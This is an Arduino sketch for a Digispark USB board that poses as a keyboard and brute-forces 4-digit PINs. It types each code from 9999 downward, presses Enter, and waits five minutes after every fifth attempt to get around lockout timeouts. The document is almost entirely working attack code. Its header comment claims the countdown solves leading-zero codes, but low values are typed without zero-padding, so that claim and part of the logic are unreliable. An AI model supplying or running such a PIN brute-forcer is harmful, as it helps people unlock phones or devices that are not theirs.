/* 4 Digit pin brute force using the digispark
* By Darren Rainey 28/11/2017 (28th Novermber 2017)
* Uses a for loop to count down from 9999 to 0000 and a
* if statment to check if it has run 5 times and if it has run 5 times
* it sends enter to press the timeout alert then waits 5 minutes and tries again
 */

#include "DigiKeyboard.h"

void setup() {
DigiKeyboard.sendKeyStroke(0);

//Count down rather than up as a work around to prevent issus with numbers starting with 0000
for(int i = 9999; i >= 0000; i--)
{
  // If the number is divisable by 5 it means we have run 5 times so we need a break
  if(i % 5 == 0)
  {
  // Delay time in miliseconds
  DigiKeyboard.println(i);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300000);
  }
  else
  {
  DigiKeyboard.println(i);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  }

}
}

void loop() {
}
